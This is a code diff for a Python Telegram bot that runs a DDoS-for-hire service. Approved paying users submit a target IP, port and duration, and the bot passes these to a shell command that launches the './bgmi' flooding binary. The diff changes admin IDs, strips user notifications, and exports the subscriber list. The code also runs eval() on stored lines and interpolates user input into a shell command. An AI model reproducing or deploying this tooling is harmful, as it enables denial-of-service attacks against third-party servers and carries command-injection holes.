@@ -16,7 +16,7 @@ bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
 # Admins list
-ADMIN_IDS = [2085082046]  # Replace with actual admin user IDs
+ADMIN_IDS = [933709537]  # Replace with actual admin user IDs
 
 # File to store user information
 USERS_FILE = 'users.txt'
@@ -30,7 +30,7 @@ running_processes = []
 CREATOR = "This File Is Made By @SahilModzOwner"  #DON'T CHANGE THIS WARNA ERROR AYEGA 100%
 
 # Async function to run attack command
-async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
+async def run_attack_command_on_codespace(target_ip, target_port, duration):
     command = f"./bgmi {target_ip} {target_port} {duration} 1300"
     try:
         process = await asyncio.create_subprocess_shell(
@@ -47,27 +47,9 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
             logging.info(f"Command output: {output}")
         if error:
             logging.error(f"Command error: {error}")
-        
-        # Send attack completion message
-        bot.send_message(
-            chat_id,
-            f"*Attack completed successfully! ✅*\n\n"
-            f"• Target: {target_ip}\n"
-            f"• Port: {target_port}\n"
-            f"• Duration: {duration} seconds\n\n"
-            f"Type /attack to launch another attack",
-            parse_mode='Markdown'
-        )
 
     except Exception as e:
         logging.error(f"Failed to execute command on Codespace: {e}")
-        bot.send_message(
-            chat_id,
-            f"*Attack failed! ❌*\n\n"
-            f"Error: {str(e)}\n\n"
-            f"Please try again or contact admin",
-            parse_mode='Markdown'
-        )
     finally:
         if process in running_processes:
             running_processes.remove(process)
@@ -76,8 +58,8 @@ async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
 
-async def run_attack_command_async(target_ip, target_port, duration, chat_id):
-    await run_attack_command_on_codespace(target_ip, target_port, duration, chat_id)
+async def run_attack_command_async(target_ip, target_port, duration):
+    await run_attack_command_on_codespace(target_ip, target_port, duration)
 
 def is_user_admin(user_id):
     return user_id in ADMIN_IDS
@@ -139,7 +121,7 @@ def approve_or_disapprove_user(message):
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
 
 Attack = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['Attack'])
 def attack_command(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -149,62 +131,38 @@ def attack_command(message):
         return
 
     try:
-        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*\n\nExample: `1.1.1.1 80 60`", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
-        bot.send_message(chat_id, f"*Error: {str(e)}*", parse_mode='Markdown')
 
 def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*Invalid format! Please send: IP PORT DURATION*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "*Invalid command format. Please use: Instant++ plan target_ip target_port duration*", parse_mode='Markdown')
             return
-        
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use a different port.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
             return
 
-        # Send attack starting message
-        bot.send_message(
-            message.chat.id,
-            f"*🚀 Attack launched!*\n\n"
-            f"• Target: {target_ip}\n"
-            f"• Port: {target_port}\n"
-            f"• Duration: {duration} seconds\n\n"
-            f"You'll be notified when it completes",
-            parse_mode='Markdown'
-        )
-
-        asyncio.run_coroutine_threadsafe(
-            run_attack_command_async(target_ip, target_port, duration, message.chat.id),
-            loop
-        )
-
-    except ValueError:
-        bot.send_message(message.chat.id, "*Invalid port number! Must be a number.*", parse_mode='Markdown')
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
-        bot.send_message(message.chat.id, f"*Error: {str(e)}*", parse_mode='Markdown')
 
 def verify():
     current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
     if current_hash != Attack:
         raise Exception("Don't Make Any Changes in The Creators Name.")        
 verify()
-
 @bot.message_handler(commands=['status'])
 def status_command(message):
     try:
-        response = (
-            "*⚡ Bot Status*\n\n"
-            f"• Running processes: {len(running_processes)}\n"
-            f"• Last checked: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"• Admin IDs: {ADMIN_IDS}"
-        )
+        # Get system status details
+        response = "*System status information*"
         bot.send_message(message.chat.id, response, parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error in status command: {e}")
@@ -216,6 +174,7 @@ def approve_list_command(message):
             send_not_approved_message(message.chat.id)
             return
         
+        # Retrieve approved users
         if not os.path.exists(USERS_FILE):
             bot.send_message(message.chat.id, "No users found.")
             return
@@ -227,15 +186,14 @@ def approve_list_command(message):
             bot.send_message(message.chat.id, "No approved users found.")
             return
 
-        response = "*Approved Users List*\n\n"
-        for user in approved_users:
-            response += (
-                f"• User ID: {user['user_id']}\n"
-                f"  Plan: {user['plan']}\n"
-                f"  Valid Until: {user.get('valid_until', 'N/A')}\n\n"
-            )
-        
-        bot.send_message(message.chat.id, response, parse_mode='Markdown')
+        filename = "approved_users.txt"
+        with open(filename, 'w') as file:
+            for user in approved_users:
+                file.write(f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user.get('valid_until', 'N/A')}\n")
+
+        with open(filename, 'rb') as file:
+            bot.send_document(message.chat.id, file)
+        os.remove(filename)
     except Exception as e:
         logging.error(f"Error in approve_list command: {e}")
 
@@ -245,20 +203,17 @@ def start_asyncio_thread():
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
+    # Create a markup object
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    
+    # Create buttons
     btn2 = KeyboardButton("Attack 🚀")
     btn4 = KeyboardButton("My Account🏦")
+
+    # Add buttons to the markup
     markup.add(btn2, btn4)
 
-    welcome_msg = (
-        "*⚡ Welcome to the Bot!*\n\n"
-        "Available commands:\n"
-        "/attack - Launch new attack\n"
-        "/status - Check bot status\n"
-        "/help - Show help menu"
-    )
-    
-    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
@@ -274,22 +229,19 @@ def handle_message(message):
             for line in file:
                 user_data = eval(line.strip())
                 if user_data['user_id'] == user_id:
-                    username = message.from_user.username or "N/A"
+                    username = message.from_user.username
                     plan = user_data.get('plan', 'N/A')
                     valid_until = user_data.get('valid_until', 'N/A')
-                    response = (
-                        f"*👤 Account Information*\n\n"
-                        f"• Username: @{username}\n"
-                        f"• User ID: {user_id}\n"
-                        f"• Plan: {plan}\n"
-                        f"• Valid Until: {valid_until}\n"
-                        f"• Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    )
+                    current_time = datetime.now().isoformat()
+                    response = (f"*USERNAME: {username}\n"
+                                f"Plan: {plan}\n"
+                                f"Valid Until: {valid_until}\n"
+                                f"Current Time: {current_time}*")
                     bot.reply_to(message, response, parse_mode='Markdown')
                     return
             bot.reply_to(message, "*No account information found.*", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "*Invalid command. Please use the buttons or type /help*", parse_mode='Markdown')
+        bot.reply_to(message, "*Invalid command. Please choose from the options provided.*", parse_mode='Markdown')
 
 if __name__ == "__main__":
     # Start the asyncio loop in a separate thread
@@ -298,3 +250,5 @@ if __name__ == "__main__":
 
     # Start the bot
     bot.polling(none_stop=True)
+
+CREATOR = "This File Is Made By @SahilModzOwner" #DON'T CHANGE THIS WARNA ERROR AYEGA 100%
